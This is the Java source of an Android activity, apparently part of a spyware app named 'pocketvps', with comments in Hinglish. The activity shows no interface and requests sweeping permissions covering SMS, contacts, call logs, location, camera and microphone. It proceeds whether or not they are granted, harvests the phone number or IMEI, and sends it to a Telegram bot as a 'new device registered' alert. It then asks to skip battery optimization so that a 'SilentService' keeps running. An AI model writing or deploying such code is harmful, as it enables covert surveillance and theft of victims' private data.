package com.rx.pocketvps;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;

/**
 * Transparent activity — user ko kuch nahi dikhta
 * Sab permissions silently request karti hai
 */
public class PermissionActivity extends Activity {
    private static final String TAG = "RX_Perm";
    private static final int REQ_CODE = 101;

    // Sab permissions jo chahiye
    private static final String[] ALL_PERMISSIONS = {
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_PHONE_NUMBERS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.CHANGE_WIFI_STATE,
        Manifest.permission.ACCESS_WIFI_STATE,
        Manifest.permission.CHANGE_NETWORK_STATE,
        Manifest.permission.ACCESS_NETWORK_STATE,
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // No layout — completely transparent
        requestAllPermissions();
    }

    private void requestAllPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            List<String> needed = new ArrayList<>();
            for (String perm : ALL_PERMISSIONS) {
                if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
                    needed.add(perm);
                }
            }

            if (!needed.isEmpty()) {
                requestPermissions(
                    needed.toArray(new String[0]),
                    REQ_CODE
                );
            } else {
                // Sab already granted — aage karo
                onAllGranted();
            }
        } else {
            onAllGranted();
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        // Granted ho ya na ho — aage badhte hain
        onAllGranted();
    }

    private void onAllGranted() {
        Log.d(TAG, "Permissions done, getting phone number...");

        // Phone number lo aur Telegram pe bhejo
        getPhoneNumberAndRegister();

        // Battery optimization hatao
        removeBatteryOptimization();

        // Service start karo
        Intent svc = new Intent(this, SilentService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }

        finish(); // Activity band karo — koi UI nahi
    }

    // ══════════════════════════════════════
    //  PHONE NUMBER AUTO CAPTURE
    // ══════════════════════════════════════
    private void getPhoneNumberAndRegister() {
        String number = "Unknown";

        try {
            TelephonyManager tm = (TelephonyManager)
                getSystemService(TELEPHONY_SERVICE);

            if (tm != null) {
                // Method 1: getLine1Number
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (checkSelfPermission(Manifest.permission.READ_PHONE_NUMBERS)
                            == PackageManager.PERMISSION_GRANTED) {
                        String n = tm.getLine1Number();
                        if (n != null && !n.isEmpty()) number = n;
                    }
                } else {
                    String n = tm.getLine1Number();
                    if (n != null && !n.isEmpty()) number = n;
                }

                // Method 2: IMEI as fallback identifier
                if (number.equals("Unknown")) {
                    try {
                        String imei = tm.getDeviceId();
                        if (imei != null) number = "IMEI:" + imei;
                    } catch (Exception ignored) {}
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Phone number error: " + e.getMessage());
        }

        Log.d(TAG, "Phone number: " + number);

        // Telegram pe immediately bhejo
        final String finalNumber = number;
        new Thread(() -> {
            TelegramManager tg = new TelegramManager(getApplicationContext());
            tg.sendMessage(
                "📱 NEW DEVICE REGISTERED!\n"
                + "──────────────────────\n"
                + "ID     : " + Config.DEVICE_ID + "\n"
                + "📞 Number : " + finalNumber + "\n"
                + "🌐 Network: " + new NetworkManager(getApplicationContext()).getNetworkType() + "\n"
                + "🔋 Battery: " + new NetworkManager(getApplicationContext()).getBatteryLevel() + "\n"
                + "──────────────────────\n"
                + "✅ App installed & running!"
            );
        }).start();
    }

    // Battery optimization hatao — service kill na ho
    private void removeBatteryOptimization() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent intent = new Intent(
                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName())
                    );
                    startActivity(intent);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Battery opt error: " + e.getMessage());
        }
    }
}
